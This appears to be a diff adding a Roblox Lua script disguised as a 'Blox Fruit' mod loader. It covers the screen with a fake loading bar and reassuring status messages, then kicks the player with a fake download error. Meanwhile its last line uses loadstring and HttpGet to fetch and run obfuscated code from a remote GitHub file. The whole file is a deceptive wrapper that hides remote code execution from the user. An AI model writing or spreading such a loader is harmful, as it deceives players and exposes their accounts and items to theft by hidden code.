@@ -1,0 +1,144 @@
+local CoreGui = game:GetService("CoreGui")
+local Players = game:GetService("Players")
+
+-- Create a ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.IgnoreGuiInset = true
+screenGui.ResetOnSpawn = false
+screenGui.Parent = CoreGui
+
+-- Black background
+local blackFrame = Instance.new("Frame")
+blackFrame.Size = UDim2.new(1, 0, 1, 0)
+blackFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+blackFrame.ZIndex = 1
+blackFrame.Parent = screenGui
+
+-- Title Text with shadow
+local titleTextShadow = Instance.new("TextLabel")
+titleTextShadow.Size = UDim2.new(1, 0, 0.1, 0)
+titleTextShadow.Position = UDim2.new(0, 0, 0.1, 0)
+titleTextShadow.BackgroundTransparency = 1
+titleTextShadow.Text = "Blox Fruit Mod Scripts Loading"
+titleTextShadow.TextColor3 = Color3.fromRGB(50, 50, 50)
+titleTextShadow.TextScaled = true
+titleTextShadow.Font = Enum.Font.GothamBold
+titleTextShadow.ZIndex = 2
+titleTextShadow.Parent = screenGui
+
+-- Title Text (main)
+local titleText = Instance.new("TextLabel")
+titleText.Size = UDim2.new(1, 0, 0.1, 0)
+titleText.Position = UDim2.new(0, 0, 0.095, 0)
+titleText.BackgroundTransparency = 1
+titleText.Text = "Blox Fruit Mod Scripts Loading"
+titleText.TextColor3 = Color3.fromRGB(255, 255, 255)
+titleText.TextStrokeTransparency = 0.5
+titleText.TextStrokeColor3 = Color3.fromRGB(0, 170, 255)
+titleText.TextScaled = true
+titleText.Font = Enum.Font.GothamBold
+titleText.ZIndex = 3
+titleText.Parent = screenGui
+
+-- Subtitle Text
+local subtitleText = Instance.new("TextLabel")
+subtitleText.Size = UDim2.new(1, 0, 0.05, 0)
+subtitleText.Position = UDim2.new(0, 0, 0.2, 0)
+subtitleText.BackgroundTransparency = 1
+subtitleText.Text = "Please wait while we prepare everything for you!"
+subtitleText.TextColor3 = Color3.fromRGB(200, 200, 200)
+subtitleText.TextScaled = true
+subtitleText.Font = Enum.Font.SourceSansItalic
+subtitleText.ZIndex = 2
+subtitleText.Parent = screenGui
+
+-- Loading Text
+local loadingText = Instance.new("TextLabel")
+loadingText.Size = UDim2.new(0.4, 0, 0.05, 0)
+loadingText.Position = UDim2.new(0.3, 0, 0.5, 0)
+loadingText.BackgroundTransparency = 1
+loadingText.Text = "LOADING..."
+loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
+loadingText.TextScaled = true
+loadingText.Font = Enum.Font.SourceSansBold
+loadingText.ZIndex = 2
+loadingText.Parent = screenGui
+
+-- Loading Bar Frame
+local loadingBarFrame = Instance.new("Frame")
+loadingBarFrame.Size = UDim2.new(0.8, 0, 0.05, 0)
+loadingBarFrame.Position = UDim2.new(0.1, 0, 0.6, 0)
+loadingBarFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+loadingBarFrame.BorderSizePixel = 0
+loadingBarFrame.ZIndex = 2
+loadingBarFrame.Parent = screenGui
+
+-- Loading Bar Filler
+local loadingBarFiller = Instance.new("Frame")
+loadingBarFiller.Size = UDim2.new(0, 0, 1, 0)
+loadingBarFiller.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+loadingBarFiller.BorderSizePixel = 0
+loadingBarFiller.ZIndex = 3
+loadingBarFiller.Parent = loadingBarFrame
+
+-- Loading Percentage Text
+local percentageText = Instance.new("TextLabel")
+percentageText.Size = UDim2.new(0.15, 0, 0.05, 0)
+percentageText.Position = UDim2.new(0.425, 0, 0.65, 0)
+percentageText.BackgroundTransparency = 1
+percentageText.Text = "0%"
+percentageText.TextColor3 = Color3.fromRGB(255, 255, 255)
+percentageText.TextScaled = true
+percentageText.Font = Enum.Font.SourceSansBold
+percentageText.ZIndex = 2
+percentageText.Parent = screenGui
+
+-- Messages
+local messages = {
+    "Checking stats...",
+    "Connecting to servers...",
+    "Loading assets...",
+    "Preparing modules...",
+    "Optimizing resources...",
+    "Almost there...",
+    "Validating data...",
+    "Finalizing setup...",
+    "Securing connections...",
+    "Ready to start!"
+}
+
+-- Animate Loading Bar
+local function updateLoadingBar()
+    local player = Players.LocalPlayer
+    for i = 1, 100 do
+        wait(4.8) -- Slower progression
+        local progress = i / 100
+        loadingBarFiller:TweenSize(UDim2.new(progress, 0, 1, 0), Enum.EasingDirection.InOut, Enum.EasingStyle.Linear, 0.1, true)
+        percentageText.Text = tostring(i) .. "%"
+        if i % 10 == 0 then
+            subtitleText.Text = messages[math.ceil(i / 10)]
+        end
+    end
+    -- Wait 5 seconds before kicking the player
+    wait(5)
+    player:Kick("Sorry, retry. The modules couldn't download. Please try again later.")
+end
+
+-- Animate "LOADING..." Text
+local function animateLoadingText()
+    while true do
+        loadingText.Text = "LOADING"
+        wait(0.6)
+        loadingText.Text = "LOADING."
+        wait(0.6)
+        loadingText.Text = "LOADING.."
+        wait(0.6)
+        loadingText.Text = "LOADING..."
+        wait(0.6)
+    end
+end
+
+-- Start Animations
+task.spawn(updateLoadingBar)
+task.spawn(animateLoadingText)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/D3athFeather/Script/main/Protected_0bbf98fb92770022c9f4dc83.lua", true))()
